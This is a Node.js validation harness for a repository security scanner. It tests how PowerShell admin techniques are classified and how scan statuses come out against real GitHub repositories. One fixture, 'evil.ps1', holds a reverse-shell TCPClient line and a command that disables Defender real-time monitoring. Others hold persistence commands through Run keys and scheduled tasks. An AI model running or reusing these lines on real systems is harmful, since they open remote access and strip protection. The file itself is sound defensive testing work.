/**
 * Local validation harness for scripts/security-scan.cjs.
 *
 * Run with a GitHub token so the GitHub API isn't rate-limited:
 *   GITHUB_TOKEN=$(gh auth token) node scripts/security-scan.local.mjs
 *
 * OpenAI is intentionally not used here - the pattern checks and status logic are
 * the core; the AI layer is supplementary and gated on a key in CI.
 */

import { createRequire } from "node:module";
const require = createRequire(import.meta.url);
const { performSecurityScan, runPatternChecks } = require("./security-scan.cjs");

const token = process.env.GITHUB_TOKEN || process.env.GH_TOKEN;
if (!token) {
  console.error("Set GITHUB_TOKEN (e.g. GITHUB_TOKEN=$(gh auth token)) to run network assertions.");
  process.exit(2);
}

const results = [];
function check(name, cond, detail) {
  results.push({ name, ok: !!cond, detail });
  console.log((cond ? "PASS  " : "FAIL  ") + name + (detail ? "  -> " + detail : ""));
}

// --- Assertion 2 & 5: severity split (synthetic, deterministic) ---
const adminScript = {
  path: "remediate.ps1",
  content: [
    "New-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name Agent -Value 'C:\\agent.exe'",
    "schtasks /create /tn MyTask /sc onlogon /tr C:\\agent.exe",
    "Register-ScheduledTask -TaskName Sync -Trigger $t -AtLogon",
    "Start-Process powershell -WindowStyle Hidden -ArgumentList '-File run.ps1'",
    "Connect-MgGraph -Scopes 'DeviceManagementManagedDevices.Read.All'",
  ].join("\n"),
};
const admin = runPatternChecks([adminScript], { owner: "o", repo: "r", branch: "main" });
const adminAllPass = Object.values(admin.checks).every((c) => c.passed);
check("admin techniques do not fail any check", adminAllPass);
check("admin techniques recorded as notes", admin.notes.length >= 3, admin.notes.length + " notes");

const evilScript = {
  path: "evil.ps1",
  content: "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444)\nSet-MpPreference -DisableRealtimeMonitoring $true",
};
const evil = runPatternChecks([evilScript], { owner: "o", repo: "r", branch: "main" });
check("reverse shell fails noMaliciousPatterns", evil.checks.noMaliciousPatterns.passed === false);

// --- Assertion 1, 3, 4: real network ---
async function main() {
  // 1. Default branch is used -> a scannable PowerShell repo actually scans files.
  const ps = await performSecurityScan(
    "https://github.com/petripaavola/Get-IntuneManagementExtensionDiagnostics",
    "Get-IntuneManagementExtensionDiagnostics",
    { githubToken: token }
  );
  check(
    "scannable PS repo scans files (default branch used)",
    ps.filesScanned > 0 && (ps.status === "passed" || ps.status === "failed"),
    "filesScanned=" + ps.filesScanned + " status=" + ps.status + " branch=" + ps.branch
  );

  // 3. Genuinely no scannable source -> not_applicable (README-only repo).
  const na = await performSecurityScan(
    "https://github.com/octocat/Hello-World",
    "Hello World",
    { githubToken: token }
  );
  check(
    "no-source repo -> not_applicable (not a fake pass)",
    na.status === "not_applicable" && na.filesScanned === 0,
    "status=" + na.status + " filesScanned=" + na.filesScanned
  );

  // 4. Unreadable/nonexistent repo -> scan_error, never passed.
  const err = await performSecurityScan(
    "https://github.com/awesomeintune-nobody/this-repo-does-not-exist-xyz123",
    "Nope",
    { githubToken: token }
  );
  check(
    "unreachable repo -> scan_error (not a fake pass)",
    err.status === "scan_error" && err.status !== "passed",
    "status=" + err.status
  );

  const failed = results.filter((r) => !r.ok);
  console.log("\n" + (results.length - failed.length) + "/" + results.length + " assertions passed.");
  process.exit(failed.length === 0 ? 0 : 1);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
